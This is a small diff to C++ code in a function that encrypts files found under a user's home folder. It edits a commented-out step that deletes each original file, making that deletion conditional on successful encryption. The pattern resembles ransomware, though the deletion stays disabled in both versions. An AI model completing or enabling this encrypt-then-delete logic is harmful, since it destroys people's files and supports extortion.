@@ -147,8 +147,8 @@ std::vector<fs::path> cryptor::Main::encrypt(const fs::path& homeFolder, const s
 			//Encrypt the file with the cryptor engine
 			common::io::CryptorEngine::Status encryptionResult = cryptorEngine.encryptFile(target, encryptedOut);
 
-			//Delete the file at the given path
-			//fs::remove(target);
+			//Delete the file at the given path if encryption was successful
+			//if(encryptionResult == common::io::CryptorEngine::Status::OK) fs::remove(target);
 
 			//Add the path to the appropriate vector depending on the result
 			encryptionResult == common::io::CryptorEngine::Status::OK ?
